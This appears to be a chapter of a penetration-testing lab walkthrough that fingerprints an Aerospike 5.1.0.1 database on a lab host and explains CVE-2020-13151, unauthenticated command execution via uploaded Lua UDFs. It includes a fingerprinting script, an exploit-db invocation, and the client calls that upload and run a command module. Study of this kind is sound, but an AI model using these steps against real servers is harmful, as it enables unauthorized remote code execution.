# 03 — Aerospike: naming the daemon

Chapter 01 left four ports without a name. This chapter gives them one, reads the version off the
wire, and explains why that version is the whole box.

---

## 3.1 From "ppp?" to a product

The block `3000-3003` is Aerospike's published default layout:

| Port | Role | This host |
|---|---|---|
| 3000 | service — the client API | open |
| 3001 | fabric — cluster internals | open |
| 3002 | info — ASCII administration | **filtered** |
| 3003 | heartbeat | open |

The pattern is self-consistent: the port that customers talk to is exposed, the port that
administrators talk to is not. `3003` answering every probe with a single bare newline is the
heartbeat protocol refusing a text packet, exactly as chapter 01 observed.

Aerospike ships an `asinfo` tool that speaks the info protocol, but it is not installed on the
attacker box and the info port is filtered anyway. The clean way to confirm the product is to speak
the *client* protocol to 3000, which is open:

```python
#!/usr/bin/env python3
"""Fingerprint the Aerospike node on 192.168.150.143:3000."""
import sys
import aerospike

HOST, PORT = "192.168.150.143", 3000

try:
    client = aerospike.client({
        "hosts": [(HOST, PORT)],
        "policies": {"timeout": 6000},
    }).connect()
except Exception as e:
    print(f"[!] connect failed: {e}")
    sys.exit(1)

for key in ("build", "version", "namespaces", "node", "edition"):
    try:
        print(f"[+] {key}: {client.info_all(key)}")
    except Exception as e:
        print(f"[-] {key}: {e}")

client.close()
```

```bash
pip3 install --break-system-packages -q aerospike
python3 poc_aerospike_check.py
```

```
[+] build: {'BB9...': (None, '5.1.0.1')}
```

`info_all()` returns a dict keyed by node id, each value a `(error, response)` pair. The only field
that matters is the string: **`5.1.0.1`**.

The connection succeeding at all is itself the first finding. Aerospike Community Edition in this
era has **no authentication** by default — no user, no password, no TLS. Anyone who can reach 3000
is a fully privileged client. The `build` call proves we are one.

---

## 3.2 The version, and what it means

Aerospike CE `5.1.0.1` sits inside the affected range of **CVE-2020-13151**, fixed in `5.1.0.3`.

The bug is not a memory corruption. It is a design decision:

1. Clients may **register Lua modules** with the server (`udf_put`).
2. Clients may **invoke** those modules on a record (`client.apply()`).
3. The Lua runtime Aerospike embeds exposes the full standard library — including `io.popen()`.

So an unauthenticated client can upload a function whose body is `io.popen(cmd):read("*a")` and then
invoke it against any record it can write. The command runs as the `aerospike` user. No exploit
development, no offset, no ASLR problem: the feature *is* the vulnerability, and the fix in `5.1.0.3`
was to sandbox the Lua environment.

CVE-2020-13151 carries a **9.8** — correctly, for once. Unauthenticated, network-reachable, no user
interaction, arbitrary command execution.

---

## 3.3 A trap in the published exploit

`searchsploit aerospike` finds one entry:

```bash
searchsploit -p 49067
```

```
Exploit: Aerospike 3.0 - OS Command Execution
URL: https://www.exploit-db.com/exploits/49067
Path: /usr/share/exploitdb/exploits/multiple/remote/49067.py
```

It is a working exploit for exactly this bug — and it refuses to run against this host. Run it and
it prints its version comparison and exits before touching the UDF:

```bash
python3 /usr/share/exploitdb/exploits/multiple/remote/49067.py \
  --ahost 192.168.150.143 --aport 3000 --namespace test \
  --udfpath /tmp/aero_poc/poc.lua --cmd 'id'
```

The guard in the script compares the build string and treats `5.1.0.0` as *fixed*. That is wrong:
`5.1.0.0` and `5.1.0.1` are both before `5.1.0.3`, and both are vulnerable. The check is
conservative in the wrong direction — it fails closed on a live target and tells you the box is
patched when it is not.

This is worth internalising, because it is the single most common way a real vulnerability gets
missed on an exam: **a tool's version gate is not evidence.** The evidence is the build string
(`5.1.0.1`), the advisory's fixed version (`5.1.0.3`), and a successful `apply()`. Two of those
three can be read off the box; the third is one call away.

The fix is not to patch the exploit. It is to use the client library directly, which is four calls:

```python
client.put(key, {"pk": "x"})                       # a record to attach the UDF to
client.udf_put("/tmp/aero_poc/poc.lua")            # upload the module
client.apply(key, "poc", "runCMD", ["id"])         # run it
```

Chapter 04 does that and reads the answer.

---

## 3.4 Why this, and not the other eight ports

A short justification, since the box offers plenty of alternatives:

| Candidate | Verdict |
|---|---|
| `vsftpd 3.0.3` | No public RCE. The `USER :)` backdoor is **2.3.4** only, removed in 2.3.5. Needs credentials we do not have. |
| `OpenSSH 8.2p1` | Ubuntu-patched build; no pre-auth primitive. Needs credentials. |
| `Apache 2.4.41` on 80/443 | Stock default page. Nothing to exploit. |
| `Apache 2.4.41` on 81 | `mod_proxy` SSRF candidate (CVE-2021-40438), left untested — see chapter 02. |
| `MySQL`, `PostgreSQL` | Both answer `unauthorized`. No credentials, and no pre-auth bug in these builds. |
| **Aerospike 3000** | **Unauthenticated by design, version `< 5.1.0.3`, ships a documented command-execution primitive.** |

A database that accepts anonymous clients and then runs the code they upload is not a hard target.
It is an open door with a welcome mat, and the rest of this walkthrough is about what is behind it.
